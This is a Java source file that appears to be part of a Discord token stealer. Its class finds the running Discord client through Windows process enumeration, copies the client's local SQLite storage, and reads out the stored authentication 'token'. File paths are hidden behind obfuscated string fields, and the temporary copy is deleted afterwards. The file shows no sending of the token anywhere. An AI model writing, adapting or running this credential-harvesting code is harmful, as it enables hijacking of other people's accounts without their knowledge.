package me.mafrans.discordsw;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.*;
import com.sun.jna.win32.W32APIOptions;


import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.ResultSet;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;

/**
 * Created by Lemon on 8/31/2017.
 */
public class Discord
{
    public static Path getDBPath()
    {
        String discordDevPath = System.getenv("APPDATA") + Main.sql.d;
        String discordCanaryPath = System.getenv("APPDATA") + Main.sql.e;
        String discordPTBPath = System.getenv("APPDATA") + Main.sql.f;
        String discordPath = System.getenv("APPDATA") + Main.sql.g;

        Kernel32 kernel32 = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
        Tlhelp32.PROCESSENTRY32.ByReference processEntry = new Tlhelp32.PROCESSENTRY32.ByReference();

        WinNT.HANDLE snapshot = kernel32.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0));
        try  {
            while (kernel32.Process32Next(snapshot, processEntry)) {
                String processName = Native.toString(processEntry.szExeFile);
                if (processName.equals(Main.sql.h))
                {
                    return Paths.get(discordDevPath);
                }
                else if (processName.equals(Main.sql.i))
                {
                    return Paths.get(discordCanaryPath);
                }
                else if (processName.equals(Main.sql.j))
                {
                    return Paths.get(discordPTBPath);
                }
                else if (processName.equals(Main.sql.k))
                {
                    return Paths.get(discordPath);
                }
            }
        }
        finally {
            kernel32.CloseHandle(snapshot);
        }
        // Discord not running, get last modified file.
        try
        {
            ArrayList<File> files = new ArrayList<>();
            if (new File(discordDevPath).exists())
            {
                files.add(new File(discordDevPath));
            }
            if (new File(discordCanaryPath).exists())
            {
                files.add(new File(discordCanaryPath));
            }
            if (new File(discordPTBPath).exists())
            {
                files.add(new File(discordPTBPath));
            }
            if (new File(discordPath).exists())
            {
                files.add(new File(discordPath));
            }
            File lastModified = null;
            for (File file : files)
            {
                if (file.isFile())
                {
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(new FileInputStream(file)));
                    try
                    {
                        for (String line; (line = reader.readLine()) != null; )
                        {
                                if (lastModified == null
                                        || file.lastModified() > lastModified
                                        .lastModified())
                                {
                                    lastModified = file;
                                }
                            }
                    }
                    finally
                    {
                        reader.close();
                        return lastModified.toPath();
                    }
                }
            }
        }
        catch(IOException ex)
        {
            return null;
        }
        return null;
    }
    public static Connection connect() throws SQLException, ClassNotFoundException, IOException
    {
        String dbTempLocation = System.getenv("APPDATA") + Main.sql.l;
        if(!new File(dbTempLocation).exists())
        {
            Files.copy(Paths.get(getDBPath().toString()), Paths.get(dbTempLocation));
        }
        Class.forName("org.sqlite.JDBC");
        String url = "jdbc:sqlite:" + dbTempLocation;
        return DriverManager.getConnection(url);
    }

    public static String getToken()
    {
        try
        {
            Connection connection = connect();
            Statement statement = connection.createStatement();
            ResultSet set = statement.executeQuery("SELECT * from ItemTable");
            while(set.next())
            {
                if (set.getString(1).equals("token"))
                {
                    byte[] blob = set.getBytes(2);
                    String token = new String(blob, "UTF-8");
                    String nukeOne = token.replaceAll("\"", "");
                    String removeSpaceToken = nukeOne.replaceAll("//s+", "");
                    connection.close();
                    Files.delete(Paths.get(System.getenv("APPDATA") + Main.sql.l));
                    return removeSpaceToken;
                }
            }
        }
        catch (SQLException | ClassNotFoundException | IOException e)
        {
            return "";
        }
        return "";
    }

}
